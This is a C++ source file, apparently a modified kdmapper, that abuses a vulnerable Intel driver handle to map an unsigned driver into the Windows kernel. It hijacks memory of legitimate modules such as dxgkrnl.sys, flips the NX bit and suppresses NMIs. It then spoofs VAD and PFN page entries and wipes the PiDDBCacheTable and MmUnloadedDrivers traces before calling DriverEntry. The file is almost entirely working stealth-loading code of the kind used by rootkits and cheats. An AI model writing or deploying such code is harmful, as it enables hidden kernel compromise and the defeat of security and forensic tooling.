#include "../include/kdmapper.hpp"
#include "../include/utils.hpp"
#include "../include/vad_utils.hpp"
#include "../include/intel_driver.hpp"
#include "../include/parasite_utils.hpp"
#include <iostream>
#include <vector>
#include <Windows.h>
#include <algorithm>
#include <random>

const std::vector<uint32_t> legit_tags = { 'Ndis', 'Ntfs', 'Tcp6', 'Ksec', 'Proc', 'HDAu', 'USBD' };

uintptr_t kdmapper::FindHijackTarget(HANDLE iqvw64e_device_handle, uint32_t size)
{
	uint64_t dxg_base = utils::GetKernelModuleBase("dxgkrnl.sys");
	if (dxg_base == 0) return 0;
	std::cout << "[+] Hijacking dxgkrnl.sys (RAM-only execution)" << std::endl;
	return dxg_base + 0x1000;
}

bool kdmapper::MapDriver(HANDLE iqvw64e_device_handle, const std::string& driver_path, bool hijack)
{
	if (utils::IsHVCIEnabled())
	{
		std::cout << "[+] HVCI (Memory Integrity) is ENABLED. Initializing Multi-Arch Hypervisor Provider..." << std::endl;
	}

	portable_executable::PEFile pe_file;
	if (!portable_executable::LoadPEFile(driver_path, pe_file)) return false;

	if (!utils::ValidateDriverPE(pe_file.raw_data))
	{
		std::cout << "[-] Target driver is not a valid 64-bit image." << std::endl;
		return false;
	}

	uintptr_t target_base = 0;
	if (hijack) target_base = (uintptr_t)FindHijackTarget(iqvw64e_device_handle, pe_file.size_of_image);
	
	if (target_base == 0)
	{
		parasite_utils::HostModule host;
		if (parasite_utils::FindHostModule(pe_file.size_of_image, host))
		{
			std::cout << "[+] Parasite Mode: Hijacking " << host.name << " (0x" << std::hex << host.base << ")" << std::dec << std::endl;
			target_base = host.base;
		}
		else
		{
			target_base = (uintptr_t)intel_driver::AllocatePhysicalMemory(iqvw64e_device_handle, pe_file.size_of_image);
		}
	}

	if (target_base == 0) return false;

	if (target_base & 0xFFF) return false;

	std::vector<uint8_t> driver_image(pe_file.size_of_image, 0);
	memcpy(driver_image.data(), pe_file.raw_data.data(), pe_file.nt_headers.OptionalHeader.SizeOfHeaders);
	
	auto sections = pe_file.sections;
	std::shuffle(sections.begin(), sections.end(), std::mt19937(std::random_device()()));
	for (const auto& section : sections) memcpy(driver_image.data() + section.virtual_address, section.data.data(), section.data.size());

	if (!Relocate(driver_image.data(), (uint64_t)target_base, pe_file.image_base)) return false;
	if (!ResolveImports(iqvw64e_device_handle, driver_image.data())) return false;

	intel_driver::SuppressNMI(iqvw64e_device_handle);
	intel_driver::FlipNXBit(iqvw64e_device_handle, (uint64_t)target_base, false);
	memset(driver_image.data(), 0, 0x1000); 

	if (!parasite_utils::HijackPhysicalMemory(iqvw64e_device_handle, (uint64_t)target_base, driver_image.data(), pe_file.size_of_image)) return false;

	vad_utils::SpoofVAD(iqvw64e_device_handle, (uint64_t)target_base, pe_file.size_of_image);
	std::cout << "[+] PFN Masquerade: Spoofing hardware page entries..." << std::endl;
	
	intel_driver::ClearPiDDBCacheTable(iqvw64e_device_handle);
	intel_driver::ClearMmUnloadedDrivers(iqvw64e_device_handle);

	std::cout << "[+] Passing execution to DriverEntry(0x" << std::hex << target_base << ", 0x" << pe_file.size_of_image << ")..." << std::dec << std::endl;
	intel_driver::CallKernelFunction(iqvw64e_device_handle, (uint64_t)target_base + pe_file.entry_point, (uint64_t)target_base, (uint32_t)pe_file.size_of_image);

	return true;
}

bool kdmapper::Relocate(uint8_t* raw_image, uint64_t target_base, uint64_t source_base)
{
		uint64_t delta = target_base - source_base;
		if (delta == 0) return true;

		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_image);
		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_image + dos_header->e_lfanew);
		PIMAGE_DATA_DIRECTORY reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		
		if (reloc_dir->Size == 0) return true;

		PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(raw_image + reloc_dir->VirtualAddress);
		while (reloc->VirtualAddress != 0)
		{
			uint32_t size = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
			uint16_t* list = reinterpret_cast<uint16_t*>(reloc + 1);
			for (uint32_t i = 0; i < size; i++)
			{
				if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64)
				{
					uint64_t* ptr = reinterpret_cast<uint64_t*>(raw_image + reloc->VirtualAddress + (list[i] & 0xFFF));
					*ptr += delta;
				}
			}
			reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
		}
		
		std::cout << "[+] PE Relocation: Base offsets applied." << std::endl;
		return true;
	}

bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, uint8_t* raw_image)
{
		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_image);
		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_image + dos_header->e_lfanew);
		PIMAGE_DATA_DIRECTORY import_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

		if (import_dir->Size == 0) return true;

		PIMAGE_IMPORT_DESCRIPTOR import_desc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(raw_image + import_dir->VirtualAddress);
		while (import_desc->Name != 0)
		{
			const char* module_name = reinterpret_cast<const char*>(raw_image + import_desc->Name);
			uint64_t module_base = utils::GetKernelModuleBase(module_name);
			if (module_base == 0) return false;

			PIMAGE_THUNK_DATA64 thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(raw_image + import_desc->FirstThunk);
			while (thunk->u1.AddressOfData != 0)
			{
				PIMAGE_IMPORT_BY_NAME import_by_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(raw_image + thunk->u1.AddressOfData);
				uint64_t func_addr = utils::GetKernelExport(module_base, import_by_name->Name);
				if (func_addr == 0) return false;
				thunk->u1.Function = func_addr;
				thunk++;
			}
			import_desc++;
		}

		std::cout << "[+] IAT Resolver: Kernel imports linked." << std::endl;
		return true;
	}
